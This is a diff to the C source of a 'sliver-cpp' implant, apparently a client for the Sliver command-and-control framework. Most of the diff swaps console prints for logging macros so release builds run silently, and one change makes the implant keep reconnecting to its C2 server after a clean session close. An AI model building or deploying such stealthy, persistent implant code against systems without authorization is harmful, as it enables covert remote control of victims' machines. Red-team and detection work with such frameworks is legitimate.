@@ -41,24 +41,24 @@ static void smoke_worker(void *arg) {
 }
 
 static void print_banner(void) {
-  (void)printf("sliver-cpp implant %s (build %s)\n", sliver_config_name(),
+  LOG_INFO("sliver-cpp implant %s (build %s)\n", sliver_config_name(),
                sliver_config_build_id());
 }
 
 static void print_config(void) {
-  (void)printf("  strategy         : %c\n", sliver_config_strategy());
-  (void)printf("  c2 endpoints     : %u\n", (unsigned)sliver_config_c2_count());
+  LOG_INFO("  strategy         : %c\n", sliver_config_strategy());
+  LOG_INFO("  c2 endpoints     : %u\n", (unsigned)sliver_config_c2_count());
   for (size_t i = 0; i < sliver_config_c2_count(); ++i) {
-    (void)printf("    [%u] %s\n", (unsigned)i, sliver_config_c2_url(i));
+    LOG_INFO("    [%u] %s\n", (unsigned)i, sliver_config_c2_url(i));
   }
-  (void)printf("  reconnect (ms)   : %lld\n",
+  LOG_INFO("  reconnect (ms)   : %lld\n",
                sliver_config_reconnect_interval_ns() / 1000000LL);
-  (void)printf("  beacon interval  : %lld ms\n",
+  LOG_INFO("  beacon interval  : %lld ms\n",
                sliver_config_beacon_interval_ns() / 1000000LL);
-  (void)printf("  beacon jitter    : %lld ms\n",
+  LOG_INFO("  beacon jitter    : %lld ms\n",
                sliver_config_beacon_jitter_ns() / 1000000LL);
-  (void)printf("  max conn errors  : %d\n", sliver_config_max_connection_errors());
-  (void)printf("  transports       : mtls=%d http=%d dns=%d wg=%d pivot=%d\n",
+  LOG_INFO("  max conn errors  : %d\n", sliver_config_max_connection_errors());
+  LOG_INFO("  transports       : mtls=%d http=%d dns=%d wg=%d pivot=%d\n",
                sliver_config_feature_mtls(), sliver_config_feature_http(),
                sliver_config_feature_dns(), sliver_config_feature_wg(),
                sliver_config_feature_pivot());
@@ -72,13 +72,13 @@ static int run_smoke(void) {
   state.mutex = sliver_mutex_create();
   state.counter = 0;
   if (state.mutex == NULL) {
-    (void)fprintf(stderr, "mutex_create failed\n");
+    LOG_ERROR("mutex_create failed\n");
     return 1;
   }
   for (size_t i = 0; i < sizeof(threads) / sizeof(threads[0]); ++i) {
     threads[i] = sliver_thread_create(smoke_worker, &state);
     if (threads[i] == NULL) {
-      (void)fprintf(stderr, "thread_create failed\n");
+      LOG_ERROR("thread_create failed\n");
       rc = 1;
       threads[i] = NULL;
     }
@@ -88,7 +88,7 @@ static int run_smoke(void) {
       rc = 1;
     }
   }
-  (void)printf("smoke: counter=%ld expected=%d\n", state.counter,
+  LOG_INFO("smoke: counter=%ld expected=%d\n", state.counter,
                SLIVER_SMOKE_ITERATIONS * 4);
   if (state.counter != (long)(SLIVER_SMOKE_ITERATIONS * 4)) {
     rc = 1;
@@ -143,8 +143,7 @@ static int run_tls_selftest(int argc, char **argv) {
   int rc = 1;
 
   if (argc < 7) {
-    (void)fprintf(stderr,
-                  "usage: %s --tls-selftest <host> <port> <ca.pem> <cert.pem> <key.pem>\n",
+    LOG_ERROR("usage: %s --tls-selftest <host> <port> <ca.pem> <cert.pem> <key.pem>\n",
                   argv[0]);
     return 2;
   }
@@ -158,7 +157,7 @@ static int run_tls_selftest(int argc, char **argv) {
   cert = read_file(cert_path);
   key = read_file(key_path);
   if (ca == NULL || cert == NULL || key == NULL) {
-    (void)fprintf(stderr, "cannot read one of: %s %s %s\n", ca_path, cert_path, key_path);
+    LOG_ERROR("cannot read one of: %s %s %s\n", ca_path, cert_path, key_path);
     free(ca);
     free(cert);
     free(key);
@@ -167,15 +166,15 @@ static int run_tls_selftest(int argc, char **argv) {
 
   err[0] = '\0';
   if (sliver_tls_connect(&conn, host, port, ca, cert, key, err, sizeof(err)) != 0) {
-    (void)fprintf(stderr, "handshake failed: %s\n", err);
+    LOG_ERROR("handshake failed: %s\n", err);
     goto out;
   }
-  (void)printf("handshake ok: %s / %s\n", sliver_tls_version(conn),
+  LOG_INFO("handshake ok: %s / %s\n", sliver_tls_version(conn),
                sliver_tls_ciphersuite(conn));
 
   if (sliver_tls_write(conn, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
       SLIVER_YAMUX_PREFACE_LEN) {
-    (void)fprintf(stderr, "write of MUX/1 failed\n");
+    LOG_ERROR("write of MUX/1 failed\n");
     goto out;
   }
   {
@@ -183,7 +182,7 @@ static int run_tls_selftest(int argc, char **argv) {
     size_t used = 0;
     const char *hello = "sliver-cpp hello\n";
     if (sliver_tls_write(conn, hello, strlen(hello)) != (long)strlen(hello)) {
-      (void)fprintf(stderr, "write of probe line failed\n");
+      LOG_ERROR("write of probe line failed\n");
       goto out;
     }
     while (used < sizeof(line) - 1) {
@@ -198,11 +197,11 @@ static int run_tls_selftest(int argc, char **argv) {
       }
     }
     if (used == 0) {
-      (void)fprintf(stderr, "read of echo failed\n");
+      LOG_ERROR("read of echo failed\n");
       goto out;
     }
     line[used] = '\0';
-    (void)printf("echo (%u bytes): %s", (unsigned)used, line);
+    LOG_INFO("echo (%u bytes): %s", (unsigned)used, line);
   }
   rc = 0;
 
@@ -268,8 +267,7 @@ static int run_yamux_selftest(int argc, char **argv) {
   int rc = 1;
 
   if (argc < 6) {
-    (void)fprintf(stderr,
-                  "usage: %s --yamux-selftest <host> <port> <age-priv> <server.pub>\n",
+    LOG_ERROR("usage: %s --yamux-selftest <host> <port> <age-priv> <server.pub>\n",
                   argv[0]);
     return 2;
   }
@@ -280,31 +278,31 @@ static int run_yamux_selftest(int argc, char **argv) {
 
   pub_text = read_file(pub_path);
   if (pub_text == NULL) {
-    (void)fprintf(stderr, "cannot read %s\n", pub_path);
+    LOG_ERROR("cannot read %s\n", pub_path);
     return 2;
   }
   if (sliver_frame_signer_init(&signer, age_priv) != 0) {
-    (void)fprintf(stderr, "signer init failed\n");
+    LOG_ERROR("signer init failed\n");
     free(pub_text);
     return 2;
   }
 
   sock = sliver_tcp_connect(host, port);
   if (sock == NULL) {
-    (void)fprintf(stderr, "tcp connect failed\n");
+    LOG_ERROR("tcp connect failed\n");
     free(pub_text);
     return 1;
   }
   if (sliver_socket_send(sock, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
       SLIVER_YAMUX_PREFACE_LEN) {
-    (void)fprintf(stderr, "MUX/1 write failed\n");
+    LOG_ERROR("MUX/1 write failed\n");
     goto out_sock;
   }
   if (sliver_yamux_client(&yamux, sock_read_cb, sock_write_cb, sock) != 0) {
     goto out_sock;
   }
   if (sliver_yamux_open(&yamux, &sid) != 0) {
-    (void)fprintf(stderr, "yamux open failed\n");
+    LOG_ERROR("yamux open failed\n");
     goto out_yamux;
   }
   bridge.y = &yamux;
@@ -316,29 +314,29 @@ static int run_yamux_selftest(int argc, char **argv) {
   sliver_buf_init(&reply);
   if (sliver_ping_encode(&ping, 31337) != 0 ||
       sliver_envelope_encode(&envelope, 0, SLIVER_MSG_PING, ping.data, ping.len) != 0) {
-    (void)fprintf(stderr, "envelope encode failed\n");
+    LOG_ERROR("envelope encode failed\n");
     goto out_bufs;
   }
   if (sliver_frame_write(&signer, yamux_bridge_write, &bridge, envelope.data, envelope.len) != 0) {
-    (void)fprintf(stderr, "frame write failed\n");
+    LOG_ERROR("frame write failed\n");
     goto out_bufs;
   }
   (void)sliver_yamux_close_write(&yamux, sid);
 
   if (sliver_frame_read(pub_text, yamux_bridge_read, &bridge, &reply) != 0) {
-    (void)fprintf(stderr, "reply frame read/verify failed (bridge_failed=%d, got=%u)\n",
+    LOG_ERROR("reply frame read/verify failed (bridge_failed=%d, got=%u)\n",
                   bridge.failed, (unsigned)reply.len);
     goto out_bufs;
   }
   if (sliver_envelope_decode(reply.data, reply.len, &env) != 0) {
-    (void)fprintf(stderr, "reply envelope decode failed\n");
+    LOG_ERROR("reply envelope decode failed\n");
     goto out_bufs;
   }
-  (void)printf("yamux ok: stream=%u reply type=%u", sid, env.type);
+  LOG_INFO("yamux ok: stream=%u reply type=%u", sid, env.type);
   if (env.type == SLIVER_MSG_PING && sliver_ping_decode_nonce(env.data, env.data_len, &nonce) == 0) {
-    (void)printf(" nonce=%d", nonce);
+    LOG_INFO(" nonce=%d", nonce);
   }
-  (void)printf("\n");
+  LOG_INFO("\n");
   rc = 0;
 
 out_bufs:
@@ -366,8 +364,7 @@ static int run_mtls_session(int argc, char **argv) {
   const char *name;
 
   if (argc < 9) {
-    (void)fprintf(stderr,
-                  "usage: %s --mtls <host> <port> <ca.pem> <cert.pem> <key.pem> "
+    LOG_ERROR("usage: %s --mtls <host> <port> <ca.pem> <cert.pem> <key.pem> "
                   "<age-priv> <server.pub> [name]\n",
                   argv[0]);
     return 2;
@@ -384,7 +381,7 @@ static int run_mtls_session(int argc, char **argv) {
   cfg.server_minisign_pubkey = read_file(argv[8]);
   if (cfg.ca_pem == NULL || cfg.cert_pem == NULL || cfg.key_pem == NULL ||
       cfg.server_minisign_pubkey == NULL) {
-    (void)fprintf(stderr, "cannot read one of the PEM/pubkey files\n");
+    LOG_ERROR("cannot read one of the PEM/pubkey files\n");
     return 2;
   }
 
@@ -512,9 +509,7 @@ static int run_from_build_config(const char *argv0) {
       reconnect_ms = 60000;
     }
     for (;;) {
-      if (sliver_session_run(&cfg) == 0) {
-        return 0; /* peer closed the session cleanly */
-      }
+      (void)sliver_session_run(&cfg);
       attempts++;
       if (max_errors > 0 && attempts > max_errors) {
         LOG_ERROR("giving up after %d connection attempts", attempts);
@@ -527,19 +522,19 @@ static int run_from_build_config(const char *argv0) {
 }
 
 static void print_diagnostics(void) {
-  (void)printf("implant   : %s (build %s)\n", sliver_config_name(),
+  LOG_INFO("implant   : %s (build %s)\n", sliver_config_name(),
                sliver_config_build_id());
-  (void)printf("transport : %s\n", sliver_config_c2_count() > 0 ? sliver_config_c2_url(0)
+  LOG_INFO("transport : %s\n", sliver_config_c2_count() > 0 ? sliver_config_c2_url(0)
                                                                : "(none)");
 #if defined(IMPLANT_CRYPTO_ENABLED)
-  (void)printf("crypto    : mbedtls 3.6 + ed25519 + blake2b\n");
+  LOG_INFO("crypto    : mbedtls 3.6 + ed25519 + blake2b\n");
 #else
-  (void)printf("crypto    : NOT LINKED (IMPLANT_CRYPTO=OFF)\n");
+  LOG_INFO("crypto    : NOT LINKED (IMPLANT_CRYPTO=OFF)\n");
 #endif
 #if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG
-  (void)printf("build     : debug (console logging enabled)\n");
+  LOG_INFO("build     : debug (console logging enabled)\n");
 #else
-  (void)printf("build     : release (silent)\n");
+  LOG_INFO("build     : release (silent)\n");
 #endif
 }
 
@@ -547,13 +542,14 @@ int sliver_cli_main(int argc, char **argv) {
   char err[128];
 
   if (sliver_plat_init() != 0) {
-    (void)fprintf(stderr, "platform init failed\n");
+    LOG_ERROR("platform init failed\n");
     return 1;
   }
 
 #if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG
   /* Debug builds: verbose logs, console + file, overridable through
    * SLIVER_LOG_LEVEL / SLIVER_LOG_FILE (also for injected payloads). */
+  sliver_log_init();
   sliver_log_set_level(SLIVER_LOG_DEBUG);
   sliver_log_init_from_env();
 #endif
@@ -592,12 +588,12 @@ int sliver_cli_main(int argc, char **argv) {
       ca = sliver_config_secret(SLIVER_SECRET_MTLS_CA_CERT);
     }
     if (ca == NULL) {
-      (void)printf("no CA certificate\n");
+      LOG_INFO("no CA certificate\n");
     } else {
       char check[192];
       (void)sliver_tls_check_cert(ca, check, sizeof(check));
-      (void)printf("--- ca begin (len=%u) ---\n%s\n--- ca end ---\n", (unsigned)strlen(ca), ca);
-      (void)printf("parse: %s\n", check);
+      LOG_INFO("--- ca begin (len=%u) ---\n%s\n--- ca end ---\n", (unsigned)strlen(ca), ca);
+      LOG_INFO("parse: %s\n", check);
     }
     free(owned);
     sliver_plat_cleanup();
@@ -606,7 +602,6 @@ int sliver_cli_main(int argc, char **argv) {
 
   if (sliver_config_self_check(err, sizeof(err)) != 0) {
     LOG_ERROR("invalid configuration: %s", err);
-    (void)fprintf(stderr, "invalid configuration: %s\n", err);
     sliver_plat_cleanup();
     return 2;
   }
@@ -688,6 +683,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   }
 }
 #endif
+
+
+
+
+
 
 
 
